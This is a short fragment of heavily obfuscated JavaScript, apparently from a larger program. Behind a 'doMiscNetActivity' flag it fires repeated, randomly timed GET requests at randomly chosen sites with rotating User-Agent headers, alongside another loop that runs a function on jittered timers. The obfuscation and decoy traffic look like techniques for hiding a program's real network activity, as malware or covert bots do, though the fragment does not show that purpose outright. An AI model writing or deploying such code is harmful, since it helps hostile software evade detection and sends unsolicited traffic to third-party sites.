  for (let k = -0x18d * -0x1 + 0x16d1 * 0x1 + -0x185e; k < 0x1be0 + 0xec3 + 0x3 * -0xe35; k++)
    setTimeout(f, (-0x1 * -0xd5ef + -0x1801 + 0x2 * 0x1639) * k * getRandomInt(0x16 * -0x7d + 0x2157 + -0x1698, -0x112f + 0x2bd + 0xe75));
  setInterval(() => {
    f();
    for (let l = -0xbf5 + 0x73d * 0x1 + 0x4b8; l < -0x26d4 + 0x26b * 0x5 + 0x1ac1; l++)
      setTimeout(f, (-0x14d2 * 0xc + -0x3 * -0x4264 + 0x11d0c) * l * getRandomInt(0x26 * -0xa9 + 0x1 * -0x1783 + 0x2 * 0x184d, -0x1f49 + 0xb * 0x311 + 0x26f * -0x1));
  }, -0x3997ab + -0xc17e7 * 0x2 + 0x88b5f9);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x2a91 + 0x5 * -0x3b7 + -0x4e * -0xb) * getRandomInt(-0xb5 * 0x1 + 0xc0e * -0x1 + 0xac * 0x13, -0x1 * 0x238a + -0x13 * -0x1eb + -0xe2));
}, 0xec1 + 0x1 * 0x2e1 + 0x113e * -0x1);